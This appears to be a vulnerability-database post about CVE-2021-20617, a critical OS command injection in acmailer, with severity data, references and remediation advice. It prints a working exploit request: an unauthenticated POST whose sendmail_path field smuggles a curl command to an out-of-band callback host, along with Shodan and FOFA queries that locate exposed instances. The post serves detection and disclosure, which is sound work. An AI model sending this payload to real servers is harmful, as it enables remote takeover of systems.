---
layout: "post"
cve_id: "CVE-2021-20617"
title: "Acmailer - Improper Access Control to OS Command Injection"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-20617.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20617.yaml"
author: "daffainfo"
severity: "critical"
impact: "Attackers can execute arbitrary OS commands or escalate privileges, potentially leading to full system compromise and sensitive data exposure.
"
remediation: "Update to the latest version of acmailer and acmailer DB to address the issue.
"
reference:
  - "https://starlabs.sg/blog/2023/02-dissecting-the-vulnerabilities-a-comprehensive-teardown-of-acmailer/"
  - "https://www.acmailer.jp/info/de.cgi?id=101"
  - "https://jvn.jp/en/jp/JVN35906450/index.html"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-20617"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2021-20617', 'epss-score': 0.40785, 'epss-percentile': 0.9724, 'cwe-id': 'NVD-CWE-Other', 'cpe': 'cpe:2.3:a:acmailer:acmailer:*:*:*:*:*:*:*:*,cpe:2.3:a:acmailer:acmailer_db:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'acmailer', 'product': 'acmailer,acmailer_db', 'shodan-query': 'title="ACMAILER4.0"', 'fofa-query': 'title="ACMAILER4.0"'}"
tags:
  - "cve"
  - "cve2021"
  - "acmailer"
  - "rce"
  - "vkev"
  - "oast"
  - "oob"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Improper access control vulnerability in acmailer ver. 4.0.1 and earlier, and acmailer DB ver. 1.1.3 and earlier allows remote attackers to execute an arbitrary OS command, or gain an administrative privilege which may result in obtaining the sensitive information on the server via unspecified vectors.


## üåê HTTP Request
```nohighlight
POST /init_ctl.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Content-Length: 199
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

admin_name=IC0T2&admin_email=zwzlLx@ivqsL.com&login_id=loginid&login_pass=loginpw&sendmail_path=|curl http://d5itjjhle0o3am178n7geatqjcxdxy89z.oast.site&homeurl=http%3A%2F%2Fexample.com&mypath=env%2F
```

